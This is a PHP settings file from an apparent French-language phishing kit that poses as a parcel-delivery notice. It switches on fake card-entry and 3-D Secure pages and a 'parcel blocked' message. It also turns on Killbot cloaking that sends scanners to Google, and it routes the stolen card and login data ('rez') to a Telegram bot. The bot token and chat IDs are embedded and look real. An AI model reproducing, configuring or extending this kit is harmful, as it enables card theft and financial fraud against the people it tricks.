<?php
/*---  Rez sur son Mail  ---*/
$mail_sending = false;
$rezmail = "";


/*---  Configuration des OPTIONS  ---*/

$vbv_page = true;                   /* False =  Pas de Page VBV active | True = Page VBV active */
$timer = "25";                       /* Temps de redirections pour aller de la page CC à la VBV */
$msg_login = true;                  /* Affiche message Colis bloqué apres le login */
$Numéro_colis = "DE56GVJOP";        /* Affiche Numéro du Colis */



/* --- Permet de test la scama avec une langue de votre choix dispo sur la scama --- */

$testerlalangue = false;   /* True = Test de la scama avec la langue de votre choix | Laissé False lors du spam ou alors metter 'True' + 'FR' pour l'utiliser pour uniquement la france*/
$languetest = 'fr';       /* Choix de votre langue écriture minuscule */

$killbotToken ="6cef6e77-552b-4322-bd98-ccdd190901f2";         /* Ta clé Killbots */
$killbotRedirect = "https://www.google.com";         /* Lien de redirection si bot */



/*---  Rez sur bot télégram  ---*/

$telegram_sending = true;                       /* ACTIVE OU NON DE REZ VIA TELEGRAM */
$bot_token = "6557549238:AAEuuEevK6bWuTDLgFAktxZfx8coo-eLyME"; /* TOKEN BOT */
$chat_login = "6616401168";                 /* CHAT ID : de tout les rez */
$chat_visits = "6616401168";                /* CHAT ID : Toutes connexions validé ou non irons dans se canal */

#---------------------------------REZ DANS TELEGRAM--------------------------------------------#

$ip_dev = "127.0.0.1"; /* NE PAS TOUCHER TU PEUX TESTER VIA LOCALHOST / XAMPP / SERVER LOCAL */
$ip_bypass = "127.0.0.1"; /* TU MET TON IP PERMET DE BYPASS LES VPN / ISP / POUR FAIRE TES TEST DIRECT SUR PLESK */
?>